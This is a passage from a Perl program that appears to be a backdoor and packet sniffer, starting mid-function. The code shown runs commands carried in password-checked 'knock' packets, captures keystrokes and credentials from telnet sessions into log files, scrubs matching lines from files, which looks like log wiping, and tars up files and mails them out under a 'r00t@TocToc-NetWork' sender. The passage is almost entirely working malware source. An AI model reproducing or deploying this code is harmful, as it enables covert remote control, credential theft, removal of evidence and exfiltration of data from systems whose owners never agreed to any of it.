     my $lowest = (($PKT{DSTPORT} < $PKT{SRCPORT}) ? $PKT{DSTPORT} : $PKT{SRCPORT});

     $PKT{DSTMAC}     = join(":", grep { $_ =~ /^\S{2}$/ } split(/(\S{2})/, uc($eth->{dest_mac})));
     $PKT{SRCMAC}     = join(":", grep { $_ =~ /^\S{2}$/ } split(/(\S{2})/, uc($eth->{src_mac})));
     $PKT{SRCIP}      = $ip->{src_ip};
     $PKT{DSTIP}      = $ip->{dest_ip};
     $PKT{SERVNAME}   = getservbyport($lowest, $PKT{PROTO});
     $PKT{PACKETSIZE} = length($pkt);
     $PKT{PACKET}     = $pkt;
     $PKT{IFACE}      = $iface;
     $PKT{DATASIZE}   = length($PKT{DATA});

     if ($PKT{DATA} =~ /\:$/ and
        $PKT{DATA} =~ /:(.*?):(\d+):(\d+):(.*?):(.*?):(.*?):(.*?):(.+?):(.*?):(\d+)\s/) {

        %IFACES = get_ifaces;
        return(undef) unless (grep { $IFACES{$_} eq $PKT{DSTIP} } (keys(%IFACES)));

        my $client_host = (($1 ne '')? $1 : $PKT{SRCIP});
        my $port = $2;
        my $udpp = $3;
        my $sip = $4;
        my $sport = $5;
        my $psip  = $6;
        my $psport = $7;
        my $proto = $8;
        my $options = $9;
        my $key_size = $10;

        my $keypass = $PKT{DATA};
        $keypass =~ s/^.*?:/\:/;
        $keypass =~ s/^(\:.*?){9}\d+\s//;
        $keypass =~ s/\:$//;

        my @keypass = split('', $keypass);
        my $key = join('', @keypass[0 .. ($key_size-1)]);
        my $cli_pass = join('', @keypass[$key_size .. $#keypass]);
        my $cipher = new Crypt::CBC($key, 'DES_EDE3');

        my $msg = "CONN $client_host:$port:$udpp:$sip:$sport:$psip:$psport:".lc($proto).":$options:$key_size:".$key.":";

        if (crypt(($cipher->decrypt($cli_pass)), $pass) eq $pass or ord($cipher->decrypt($cli_pass)) == 1) {
          if ($proto =~ /^TTP_(.+?)$/) {
             my $exec = $1;
             $exec =~ s/\001/ /g;
             my $pid = fork();
             unless ($pid) { exec("$exec"); exit;}
          } else {
              pwrite($msg);
          }
        }
     } elsif ($PKT{PROTO} eq "tcp" and ($PKT{DSTPORT} == 23 or $PKT{SRCPORT} == 23)) {
           my (%TEL, $io);

           # doesn't matter whois the server at all
           # we just assume that the server is one
           # using the lowest port
           if ($PKT{DSTPORT} > $PKT{SRCPORT}) {
             $TEL{server} = $PKT{SRCIP};
             $TEL{client} = $PKT{DSTIP};
             $TEL{client_port} = $PKT{DSTPORT};
             $io = "IN";
           } else {
              $TEL{server} = $PKT{DSTIP};
              $TEL{client} = $PKT{SRCIP};
              $TEL{client_port} = $PKT{SRCPORT};
              $io = "OUT";
           }

           my @chars = split('', $PKT{DATA});


           # gee ... eheh is there a possible way? just to avoid bugs :)
           $TELNET{$TEL{server}}{"$TEL{client}:$PKT{client_port}"}{$io} = ''
             if (length($TELNET{$TEL{server}}{"$TEL{client}:$PKT{client_port}"}{$io}) > 1500);

           my $BUF = $TELNET{$TEL{server}}{"$TEL{client}:$PKT{client_port}"}{$io};

           foreach my $char (@chars) {
                # linux               ruindows
             if (ord($char) == 127 or ord($char) == 8) {
               $BUF =~ s/.?$//;
             } elsif ($char eq ' ') {
                $BUF .= $char;
             } elsif (ord($char) == 13) {
                $BUF .= "\n";
             } elsif (grep { $_ eq $char } @rchars) {
                $BUF .= $char;
             }
           }

           my $lines = '';
           if ($BUF =~ /^(.*)\n(.*)/) {
             $lines = $1;
             $BUF = $2;
           }

           my $dir = $SNIF{DIR};
           $dir =~ s/\/$//;
           mkdir("$dir", 0700) if (!-d "$dir" and $dir !~ /^(\s+|)$/);

           my $logfile = $SNIF{TELNET_LOG};

           if ($lines ne '' and open(TLOG, ">> $dir/$logfile")) {
             print TLOG "[ ".$PKT{SRCIP}.":".$PKT{SRCPORT}." -> ".$PKT{DSTIP}.":".$PKT{DSTPORT}." ]\n";
             print TLOG $lines."\n\n";
             close(TLOG);
           }

           $TELNET{$TEL{server}}{"$TEL{client}:$PKT{client_port}"}{$io} = $BUF;
     } elsif (can_log(%PKT)) {
          my $sts = "$SNIF{LOG_LINE} $SNIF{LOG_FILE}";
          if ($sts =~ /{.+?NAME}/) {  # we resolve only when needed
            $PKT{SRCNAME}  = resolve($PKT{SRCIP});
            $PKT{DSTNAME}  = resolve($PKT{DSTIP});
          }

          my $line = convert_string($SNIF{LOG_LINE}, %PKT);
          my $file = convert_string($SNIF{LOG_FILE}, %PKT);

          my $dir = $SNIF{DIR};
          $dir =~ s/\/$//;
          mkdir("$dir", 0700) if (!-d "$dir" and $dir !~ /^(\s+|)$/);

          if ($file and open(LOG, ">> $dir/$file")) {
            print LOG $line."\n";
            close(LOG);
          }
     }
     undef(%PKT);
     undef($tcp);
     undef($ip);
     undef($udp);
     undef($icmp);
     undef($eth);

     return(1);
   }

   sub can_log {
     my %PKT = @_;

     my @ports = get_ports($PKT{PROTO});

     if ($PKT{PROTO} eq "icmp") {
       return(1) if ($SNIF{ICMP} == 1);
     } elsif ($PKT{PROTO} eq "tcp" or $PKT{PROTO} eq "udp") {
         return(undef) if ($PKT{PROTO} eq "tcp" and $SNIF{TELNET} == 1 and ($PKT{DSTPORT} == 23 or $PKT{SRCPORT} == 23));
         return(1) if (lc($SNIF{uc($PKT{PROTO})}) eq "all");
         return(1) if (grep { $_ eq $PKT{DSTPORT} or $_ eq $PKT{SRCPORT} } @ports);
     }

     return(undef);
   }


   sub get_ports {
     my $proto = shift;

     return(undef) unless (defined($SNIF{uc($proto)}));
     my @rp = split(',', $SNIF{uc($proto)});

     my @ports;
     foreach my $rp (@rp) {
       if ($rp =~ /(\d+)\-(\d+)/) {
         push(@ports, ($1 .. $2));
       } elsif ($rp =~ /(\d+)/) {
          push(@ports, $1);
       }
     }

     return(@ports);
   }

   sub convert_string {
      my ($string, %HASH) = @_;

      $HASH{TIME} = time;
      my $year;
      my $stime = stat_time($HASH{TIME}, 'h');
      ($HASH{HOUR},$HASH{MINUTE}, $HASH{SECOND}) = split(':', $stime);
      ($HASH{DAY}, $HASH{MONTH}, $year) = (localtime($HASH{TIME}))[3 .. 5];
      $HASH{YEAR} = 1900+$year;
      $HASH{MONTH} = sprintf("%02d", $HASH{MONTH} % 100);
      $HASH{LOCALTIME} = "$HASH{HOUR}:$HASH{MINUTE}:$HASH{SECOND} $HASH{MONTH}\/$HASH{DAY}\/$HASH{YEAR}";

      if ($HASH{PROTO} eq "icmp") {
        $HASH{DSTPORT} = 0;
        $HASH{SRCPORT} = 0;
      }

      if (defined($SNIF{REMOVE_ENT}) and $SNIF{REMOVE_ENT} == 1) {
        $HASH{DATA} =~ s/\n$//;
        $HASH{DATA} =~ s/\r$//;
      }

      $string =~ s/{(.+?)}/$HASH{$1}/g;

      return($string);
   }

   #############
   # MISC SUBs #
   #############

   sub restart {
     return() unless (-e "$SELF");
     foreach my $iface (keys(%SNIFFER)) {
       my $pid = $SNIFFER{$iface}->{PID} if (defined($SNIFFER{$iface}->{PID}));
       next unless ($pid =~ /^\d+$/);
       kill(9, $pid) if (kill(0, $pid));
     }
     syswrite(DWTR, "1\n", 2);
     chmod(0777, "$SELF");
     exec("$SELF");
   }


   sub self_file {
     my $dir = getcwd;
     $dir = '' if ($dir eq '/');
     my $name = $_[0] || $0;
     $name =~ s/^.+?perl\s+(\S+)/$1/;
     my $SELF = "$dir/$name";
     $SELF =~ s/^\/\//\//;
     return($SELF);
   }

   # bytes kbytes megs gigs
   sub bkmg {
     my $bytes = shift;

     my $ret;

     my $kbytes = $bytes/1024;
     my $megas  = $kbytes/1024;
     my $gigs   = $megas/1024;


     if ($gigs > 1 ) {
        $ret = round($gigs, 2)." gb";
     } elsif ($megas > 1) {
        $ret = round($megas, 2)." mb";
     } elsif ($kbytes > 1) {
        $ret = round($kbytes, 2)." kb";
     } else {
        $ret = "$bytes b";
     }

     return($ret);
   }

   sub doit { # if possible
     my ($func, @args) = @_;
     no strict 'refs';

     return(eval { &{$func}(@args) }) if ($func = exists_func($func));
     return(undef);
   }

   sub exists_func {
     my $func = shift;
     $func = "main::".$func unless($func =~ /::/);

     return($func) if (defined(&{$func}));

     return(undef);
   }

   sub is_loaded {
     my $module = shift;
     $module =~ s/::/\//g;
     $module .= ".pm";

     return(1) if (grep { $_ eq $module } keys(%INC));
     return(undef);
   }

   sub safeload {
     my ($module, $require, $arg) = @_;
     my $file = $module;
     $file =~ s/::/\//g;

     if ($require) {
       # all found gonna be loaded
       map { eval ("require \"$_/$file\";") if(-f "$_/$file"); } @INC;
     } else {
         $file .= ".pm" unless ($file =~ /(\.pm|\.ph)$/);
         return(eval("use $module $arg;")) if (grep { -f "$_/$file" } @INC);
     }

     return();
   }

   sub hexaddr {
     return(join("\.", reverse(split(/\./, (inet_ntoa(pack "N", hex(shift)))))));
   }

   sub wipe {
     my (%LIST) = @_;
     delete($LIST{TIME});

     my $wpid = fork();
     unless ($wpid) {
       foreach my $file (keys(%LIST)) {
         next unless (open(FILE, "< $file"));
         unless (open(TMP, "> /tmp/.aPtmp")) { # ???
           close(FILE);
           next;
         }

         my @wipe_words = split(/ +/, $LIST{$file});

         while (<FILE>) {

           my @line_words = split(/ +/, $_);

           my $skip = 0;
           foreach my $wipe_word (@wipe_words) {
             if (grep { $_ =~ /$wipe_word/i } @line_words) {
               $skip = 1;
               last;
             }
           }
           next if ($skip == 1);
           print TMP $_;
         }
         close FILE;
         close TMP;
         open(FILE, "> $file");
         open(TMP, "< /tmp/.aPtmp");
         while(<TMP>) {
           print FILE $_;
         }
         close(FILE);
         close(TMP);
       }
       unlink("/tmp/.aPtmp");
       exit;
     }
   }


   # i like the wget look so i based this function on it :)
   sub ProgressBar {
     my ($cli, $init_time, $saved_bytes, $total_bytes) = @_;

     my $proto = $CLIENT{$cli}->{proto};
     my @term_size = split(/ +/, $CLIENT{$cli}->{termsize});
     $term_size[0] = 70 unless defined($term_size[0]);

     # time  #
     my $d_time = (timem())-$init_time;

     # size #
     my $unit = "Kb/s";
     my $Sps = ($saved_bytes/$d_time) / 1024;
     if ($Sps > 1024) {
        $Sps = $Sps/1024;
        $unit = "Mb/s";
     }
     $Sps = round($Sps, 2);

     # percentage #
     my $percent = ($saved_bytes*100)/$total_bytes;
     $percent = round($percent, 1);

     # i hope someone teach me a better way :/
     my $s_saved_bytes = reverse($saved_bytes);
     $s_saved_bytes =~ s/(...)/$1,/g;
     $s_saved_bytes = reverse($s_saved_bytes);
     $s_saved_bytes =~ s/^\,//;
     my $s_total_bytes = reverse($total_bytes);
     $s_total_bytes =~ s/(...)/$1,/g;
     $s_total_bytes = reverse($s_total_bytes);
     $s_total_bytes =~ s/^\,//;

     # cauculating ETA #
     my $eta = stat_time(round(($d_time*($total_bytes-$saved_bytes))/$saved_bytes, 0), "h");

     # positionating the info on the screen #
     my $show_percent = fill_space($percent, 6);
     my $show_bytes = fill_space($s_saved_bytes, length($s_total_bytes));
     my $show_Sps = fill_space($Sps, 9);
     my $show_eta = fill_space("$eta", 9);
     $show_eta = "--:--:--" if (length($show_eta) > 9);

     my $total_chars = length(" $show_percent% [] $show_bytes  $show_Sps$unit  ETA $show_eta");

     # bars #
     my $total_bars = $term_size[0]-5-$total_chars;
     if($total_bars < 10) {
        spm($cli, "DOWNLOAD", "\rYour terminal size is too small");
        return;
     }

     my $bar_per_byte = $total_bars/$total_bytes;
     my $bars_n = $bar_per_byte * $saved_bytes;

     # yeah u know 0.something may do this
     $bars_n = $total_bars if ($saved_bytes == $total_bytes);
     $bars_n-- if ($saved_bytes != $total_bytes and $bars_n == $total_bars);

     my $bars = "=" x $bars_n;
     my $blank_n = $total_bars-$bars_n;
     my $blank = " " x $blank_n;
     $bars =~ s/=$/>/ if ($bars =~ /=/ and $bars_n != $total_bars);
     $blank .= ' ' if ($total_bars != $bars_n);

     my $blank_end = " " x 5;

     spm($cli, "DOWNLOAD", "\r $show_percent% \033[1m"."[$bars$blank]"."\033[0m $show_bytes  $show_Sps$unit  ETA $show_eta$blank_end");

   }

   sub round {
     my ($number, $decimals) = @_;

     my ($int,$dec) = split('\.', $number);

     return("$int.".("0" x $decimals)) unless (defined($dec));

     my @dec_ns = split('', $dec);

     return("$int.$dec".("0" x ($decimals-(scalar(@dec_ns)))))
       if (scalar(@dec_ns) < $decimals);

     my $last_on_next = 0;
     for (my $c = $#dec_ns; $c >= 0; $c--) {
       if ($dec_ns[$c] >= 5) {
         if (($c-1) < 0) {
           $int++;
         } else {
            $dec_ns[$c-1]++;
         }
         $dec_ns[$c] = 0;
       }
       last if ($dec_ns[$c-1] != 10 and $last_on_next == 1);
       last if ($c == $decimals and $dec_ns[$c-1] != 10);
       $last_on_next = 1 if ($c < $decimals and $dec_ns[$c-1] != 10);
     }

     my $new_dec = join('', @dec_ns[0 .. ($decimals-1)]);
     my $dot = "." if ($decimals != 0);
     return("$int$dot$new_dec");
   }

   sub stat_time {
     my ($sec, $type) = @_;

     my $days = int($sec/86400);$sec %= 86400;
     my $hour = int($sec/3600); $sec %= 3600;
     my $minute = int($sec/60); $sec %= 60;

     $hour = sprintf("%02d", $hour % 100);
     $minute = sprintf("%02d", $minute % 100);
     $sec = sprintf("%02d", $sec % 100);


     if ($type eq "h") {
       return("$hour:$minute:$sec");
     } elsif ($type eq "d") {
        return("$days day(s), $hour:$minute:$sec");
     } else {
        return("$minute:$sec");
     }
   }


   sub fill_space {
     my ($chars, $max) = @_;
     my $filled = length($chars);
     my $space_n  = $max-$filled;
     return($chars) if ($space_n <= 0);

     my $space = " " x $space_n;

     return($space.$chars);
   }

   # NET STUFF #

   sub mail {
     my ($mail, $subject, $msg, @attachs) = @_;

     $msg =~ s/\n/\n\r/g;
     $msg =~ s/\r\r/\r/g;

     my ($user, $host) = split('@', $mail);
   #  my @mx = mxhost("$host");
     my @mx = @MX;
     return(undef) unless (@mx);

     my @send_attachs;

     foreach my $attach (@attachs) {
       $attach =~ /^(.*)\/(.+?)$/;
       my $filedir = $1;
       my $filename = $2;

       my $tmpfile = "/tmp/attach.$filename.tgz";
       my $dir = getcwd();
       if (-e "$attach") {
         chdir("$filedir") if (defined($filedir));
         my $ok = system("tar -czvf $tmpfile $filename > /dev/null 2> /dev/null"); # arrg.. heheh i hate to do that
         if ($ok == 0 and -e "$tmpfile") {
           push(@send_attachs, $tmpfile);
         } else {
            push(@send_attachs, $attach);
         }
         chdir("$dir");
       }
     }

     foreach my $mx (@mx) {
       my $ok = undef;
       my $sock = IO::Socket::INET->new(PeerAddr => "$mx", PeerPort => "25", Proto => "tcp", Timeout => 15) || next;

       my $mmsg = MIME::Lite->new( From    => 'r00t@TocToc-NetWork',
                                   To      => "$mail",
                                   Subject => "[".$sock->sockhost."] $subject",
                                   Type    => 'TEXT',
                                   Data    => ["$msg"]);

       for (@send_attachs) { $mmsg->attach(Path => "$_",Type => 'application/x-gtar');  }

       print $sock "EHLO toctoc.net\r\n";
       print $sock "Mail From:<sec\@toctoc.net>\r\n";
       print $sock "RCPT To:<$mail>\r\n";
       print $sock "DATA\r\n";
       $mmsg->print($sock);
       print $sock "\r\n.\r\n";
       print $sock "QUIT\r\n";
       my $last_msg;
       while (<$sock>) {
         $ok = 1 if ($last_msg =~ /250/ and $_ =~ /221/);
         $last_msg = $_;
       }
       if ($ok == 1) {
         map { unlink($_) if $_ =~ /^\/tmp\/attach\./ } @send_attachs;
         return(1);
       }
     }

     map { unlink($_) if $_ =~ /^\/tmp\/attach\./ } @send_attachs;
     return(undef);
   }

   sub resolve {
      my $ip = shift;

      if ((time-$last_dns_erase) >= $dns_erase) {
        $last_dns_erase = time;
        %DNS = ();
      }

      my ($x, $y);

      if ($ip =~ /(\d+\.\d+\.\d+\.\d+)/) {
         return($DNS{$ip}) if (defined($DNS{$ip}));

         $y = pack('C4', split(/\./, $ip));
         $x = (gethostbyaddr($y, &AF_INET));
         $DNS{$ip} = "$x";
         return("$x");
      } else {
         return($ip);
      }
   }

   #############

   # so we can read without blocking
   # nah I wont use the IO::Handle for that
   sub fhread {
     my $fh = shift;
     my $timeout = shift || 0;

     my $got_msg = '';
     my $msg;
     while ( my $ready = is_ready($fh, $timeout)) {
       last if ($ready == 0 or $ready == -1);

       sysread($fh, $msg, $lbuffer);
       $got_msg .= $msg;
     }

     return($got_msg);
   }

   sub is_ready {
     my ($fh, $time) = @_;
     $time = 0 unless($time);
     my $read = '';
     vec($read, fileno($fh), 1) = 1;
     my $ready = 0;
     $ready = select($read, undef, undef, $time);
     return($ready);
   }

   #############
   ## THY END ##
   #############
   __END__
